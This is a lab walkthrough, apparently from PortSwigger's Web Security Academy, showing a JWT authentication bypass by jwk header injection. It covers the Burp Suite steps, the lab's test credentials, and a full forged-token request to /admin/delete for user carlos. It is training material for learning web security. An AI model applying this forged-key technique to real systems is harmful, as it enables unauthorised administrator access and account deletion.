
# JWT authentication bypass via jwk header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip: We recommend familiarizing yourself with how to work with JWTs in Burp Suite before attempting this lab.


---------------------------------------------

References: 

- https://portswigger.net/web-security/jwt



![img](images/JWT%20authentication%20bypass%20via%20jwk%20header%20injection/1.png)

---------------------------------------------

In “JWT Editor Keys”, generate a RSA key:



![img](images/JWT%20authentication%20bypass%20via%20jwk%20header%20injection/2.png)


In Repeater, in the “JSON Web Token” tab, click “Attack” and “Embedded JWK”:



![img](images/JWT%20authentication%20bypass%20via%20jwk%20header%20injection/3.png)


With this added to the JWT, it is possible to access as administrator:



![img](images/JWT%20authentication%20bypass%20via%20jwk%20header%20injection/4.png)


And then delete the user:

```
GET /admin/delete?username=carlos HTTP/2
...
Cookie: session=eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjM2ZGJkYTM2LTU1MmMtNDM4Yi1hYzRjLTllMzY1ZmI3OGVjNSIsIm4iOiJ6ZENkb2gxMjBYbnY5Q19VeXd4Slg3OGR0cU95TVM0MmNYZm1ualRZRXVTaGdNZDR5QUJRZVV1T2JpYmlrdXl0ZGFvcGRXMFB0WTFRMkFZT2cwSDZBNGlCYlR6UkhOYU44NUlPYjVKN21naUhIcDdvSWpEbFE2d2FqWnNyYWozVVM0aFgzVGRLM2djRUctaDBFV3BTaDlBMzR5ZnEzSENLTGRFVmJWMFhnUm1JM042TmNfVlg1YUljR2tvQUxIWkJkOWcxNzlDZkJ0dnRVdTNjRlBaQThlQzlpdjV4djFBeU80SWRsT1ZkS2pOZXJuUHU5NEx6enlZbEhPYkhIV2otQmFDNVB4NEowakR5bWRQYzlIYUxtNjdubEEwYXFaNktBNEh3elpIR0pFYjJVT18tWWExSENzUmhybnoyZTJRUlBWQU9IZ1FrUFdNS0piNnZPRlU1T1EifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTE3NTd9.LK85IOFXVB2lZE24KXson0NFXgtiNj4ZZNWsOs1tLij8JRa_AdrANyirsX36vSMooau-OlY-esVixuVbUbYYBWui6fO1Ep5mP4Z1rk2GvtRGuXuaCRj6ksFxnpcRj1yWAJ6xlHEzQAFSYBUDtrQTjfydKg9sx-RFhidoabqYkDVvtVG-NYhiVa4Sjfc0_4Nc98wna3PHKU-ompJReLji53YLqqrIMml9OGSzaUYZ5VLhlhoA2OT5zwOcnnYuXx23-cbsab7Jp5Oc5GDB_bQJU_LRTNFsIoII64aEDOz1AbMlXNX4czGGuQtkyR8HKc-owQ54rJoukIMyU-yGMmYz_g
...
```
